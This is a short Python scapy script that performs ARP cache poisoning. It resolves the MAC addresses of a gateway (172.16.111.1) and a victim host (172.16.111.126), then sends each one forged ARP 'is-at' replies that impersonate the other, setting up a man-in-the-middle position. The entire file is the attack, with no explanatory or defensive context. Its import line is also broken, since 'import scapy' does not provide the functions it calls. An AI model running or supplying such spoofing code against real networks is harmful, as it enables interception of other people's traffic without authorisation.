import scapy
def get_mac(IP):
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
	ans, unans = srp(pkt, timeout=2, inter=0.1)
	for snd, rcv in ans:
		return rcv.sprintf("%Ether.src%")

def trick(gm,vm):
	send(ARP(op="is-at", pdst=vm, psrc=gm, hwdst=get_mac(vm)))
	send(ARP(op="is-at", pdst=gm, psrc=vm, hwdst=get_mac(gm)))
	
if __name__ == "__main__":
	gm="172.16.111.1"
	vm="172.16.111.126"
	trick(gm,vm)